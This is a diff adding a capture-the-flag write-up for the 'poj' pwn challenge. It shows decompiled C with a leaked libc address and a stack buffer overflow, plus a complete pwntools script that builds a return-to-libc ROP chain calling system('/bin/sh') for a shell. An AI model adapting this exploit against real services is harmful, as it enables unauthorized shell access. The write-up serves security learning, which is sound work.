@@ -86,9 +86,114 @@ print(arc4.decrypt(ct).decode())
 ```Flag: battleCTF{pwn2live_d7c51d9effacfe021fa0246e031c63e9116d8366875555771349d96c2cf0a60b}```
 
 
+## poj
+
+Decompiling the binary
+
+main()
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  write(1, "Africa battle CTF 2024\n", 0x17uLL);
+  printf("Write() address : %p\n", &write);
+  return sub_115C();
+}
+```
+it gives a libc leak for the write function then calls function ```sub_115C```
+
+sub_115c()
+```c
+ssize_t sub_115C()
+{
+  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  return read(0, buf, 0x100uLL);
+}
+```
+buffer overflow because it's reading at most ```0x100``` bytes into a buffer that can only hold up ```64``` bytes of data
+
+From this point to get the libc base we just subtract the libc leak of write with the offset of write@libc
+
+And with the libc base we can just go ahead with ROP
+
+Since i couldnt debug remotely i just went ahead exploiting it on the remote instance
+
+Solve Script
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './poj_patched'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'debug'
+rop = ROP(elf)
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+libc = ELF("libc.so.6")
+rop = ROP(libc)
 
 
 
+# Start program
+io = start()
+
+io.recvuntil(b'Write() address : ')
+leak = io.recvline().strip()
+leak_address = int(leak, 16)
+libc_base = leak_address - 0xff4d0
+libc.address = libc_base
+
+
+print("libc_base: ", hex(libc_base))
+system = libc_base + 0x4dab0
+binsh = libc_base + 0x197e34
+
+pop_rdi_jmp_rax = 0x28215 #: pop rdi; jmp rax; 
+pop_rax = 0x114d #pop rax; ret;
+binsh = libc_base + 0x197e34
+system = libc_base + 0x4dab0
+ret = 0x2668c 
+
+pop_rdi = 0x28215
+
+payload = b'A' * 72       
+payload += p64(libc_base + pop_rdi)
+payload += p64(binsh)
+payload += p64(libc_base + ret) 
+payload += p64(system)
+
+
+io.clean()
+io.sendline(payload) 
+   
+
+# Got Shell?
+io.interactive()
+```
 
 
 
